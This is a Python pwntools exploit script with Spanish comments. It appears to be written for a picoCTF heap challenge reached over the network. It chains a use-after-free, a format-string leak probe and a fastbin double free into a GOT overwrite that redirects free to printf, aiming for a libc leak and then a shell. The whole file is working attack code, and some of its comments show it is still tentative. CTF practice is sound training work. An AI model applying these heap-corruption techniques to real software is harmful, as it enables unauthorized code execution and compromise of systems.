#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Conectar
p = remote('jupiter.challenges.picoctf.org', 9521)

# Esperar e introducir nombre
p.recvuntil(b'name?')
p.sendline(b'hacker')

def buy(size):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'How much?')
    p.sendline(str(size).encode())
    return
    
def eat(idx):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b'Which one?')
    p.sendline(str(idx).encode())
    return

def reintroduce(data):
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'name?')
    p.send(data)
    response = p.recvuntil(b'>')
    return response

log.info("Explotando UAF...")

# Crear chunks
buy(0x20)  # 0
buy(0x20)  # 1

# Free chunk 0
eat(0)

# UAF: el puntero al chunk 0 sigue activo
# Reintroduce escribe en el buffer de nombre en 0x602040
# Pero si el programa copia esto al heap...

# Intentar leak con format string primero
payload = b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n'
resp = reintroduce(payload)
log.info(f"Format string response: {resp}")

# Si hay leak, analizar...
# Ahora intentar double free
eat(1)
eat(0)  # Double free!

# El fastbin ahora es: 0 -> 1 -> 0
# Podemos controlar el next pointer

# Allocar y poner dirección de GOT
buy(0x20)  # Obtiene chunk 0
got_free = 0x602018  # GOT de free o puts
reintroduce(p64(got_free))

buy(0x20)  # Obtiene chunk 1  
buy(0x20)  # Obtiene chunk 0 otra vez
buy(0x20)  # ¡Obtiene GOT como chunk!

# Ahora podemos escribir en GOT
# Sobrescribir free@got con printf@plt para leak
printf_plt = 0x400740
reintroduce(p64(printf_plt))

# Ahora cuando llamemos eat(), llamará printf en lugar de free
# Esto nos dará un leak de libc

log.info("Obteniendo leak de libc...")
eat(0)  # Esto llamará printf con el puntero del heap

# Recibir leak
leak_data = p.recv(100)
log.info(f"Leak: {leak_data}")

# Si tenemos leak, calcular system y obtener shell
# Por ahora, intentar interactivo
p.interactive()